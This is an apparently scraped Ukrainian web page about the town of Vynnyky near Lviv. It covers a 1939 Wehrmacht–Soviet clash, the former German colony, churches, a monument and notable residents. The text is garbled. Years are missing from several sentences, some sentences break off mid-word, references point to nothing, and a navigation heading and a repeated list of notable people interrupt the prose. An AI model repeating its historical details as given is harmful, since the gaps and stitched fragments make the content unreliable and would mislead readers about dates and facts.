	<p>Війська Вермахту два дні бомбардували місто, радянські частини просувались зі сходу. Їхні танки на той час не мали жодних розпізнавальних знаків, а за силуетом були схожі на польські. Спроби примітивного надання німцям сигналів маханням прапорців результатів не дали, ті відкрили вогонь. У цій сутичці загибло і було поранено близько двох десятків осіб з обох сторін, були також втрати бойових машин.</p>
<p>Через деякий час стрілянина між союзниками закінчилася і почалося братання, яке переросло у спільне розграбування тютюнової фабрики. З Винниками пов'язані біографії багатьох відомих українців. Серед них: Іван Липа літературний псевдонім Петро Шелест , який займався літературною творчістю, був засновником таємного товариства "Братство Тарасівців" і практикував медицину; Іван Огієнко митрополит Іларіон , проявив себе як талановитий поет, драматург, педагог, вчений-філолог, церковно-громадський діяч; Катря Гриневичева  — освітянка та письменниця, яка своїми повістями оживила славні сторінки української історії; Юлія Пастушенко літ.</p>
<p>Саме тут проживає і зараз відомий український письменник Юрій Винничук. Теперішній центр міста розташований на місці колишньої німецької колонії Weinbergen, від якої залишились декілька типових будинків з невеликим торцевим фасадом і витягнутих перпендикулярно до центральної вулиці та кірха. У наш час Винники — типове львівське передмістя, хоча й розташоване ближче до центру Львова , ніж деякі райони міста.</p>
<p>Містечко з населенням майже 18 тис. Серед останнього можна ще побачити гарні вілли у стилях історизму, сецесії тощо. В одній з них розмістився цікавий музей. Ще у році в місті було зведено пам'ятник Т. У році його було зруйновано та в році відбулося відкриття нового пам'ятника, що і сьогодні є гордістю та окрасою міста. Згадка про церкву у Винниках датується початком XVI ст.</p>
<p>На місці дерев'яної церкви звели нову, завершення якої припадає на р. У сучасному місті функціонують 4 храми, що належать греко-католицькій, римо-католицькій та православній конфесіям.</p><a id='u3'></a><h3>Навігаційне меню</h3><p>Винники пишаються своїми земляками — видатними діячами держави, релігії та культури: Іван Огієнко - міністр віросповідань, громадський діяч, письменник, митрополит УАПЦ, історик Церкви. Володимир Левицький - громадський і культурний діяч, письменник, літературний критик, видавець, голова Винниківської читальні. Катря Гриневичева - письменниця. Мирослава Сопілка - поетеса.</p>
<p>Іван Липа - поет, письменник, лікар, міністр здоров'я УНР. Олександра Любич-Парахоняк — відома світова оперна співачка.</p>
		
			
